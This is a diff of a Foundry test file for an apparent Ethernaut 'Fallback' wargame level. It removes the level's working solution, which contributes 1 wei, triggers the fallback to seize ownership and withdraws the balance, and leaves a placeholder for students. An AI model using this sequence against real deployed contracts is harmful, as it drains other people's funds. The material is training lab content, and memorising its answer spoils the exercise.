@@ -61,31 +61,9 @@ contract FallbackTest is Test {
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        fallbackContract.contribute.value(1 wei)();
-        emit log_named_uint(
-            "Eve's contribution: ",
-            fallbackContract.getContribution()
-        );
-
-        (bool success, ) = address(fallbackContract).call.value(1 wei)("");
-        require(success);
-
-        emit log_named_uint(
-            "Balance of the contract before withdrawal: ",
-            address(fallbackContract).balance
-        );
-
-        fallbackContract.withdraw();
-
-        emit log_named_uint(
-            "Ending balance of the contract: ",
-            address(fallbackContract).balance
-        );
-        emit log_named_address(
-            "New owner of the contract: ",
-            fallbackContract.owner()
-        );
-        emit log_named_uint("Balance of Eve (after): ", eve.balance);
+        /**
+         * YOUR CODE GOES HERE
+         */
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
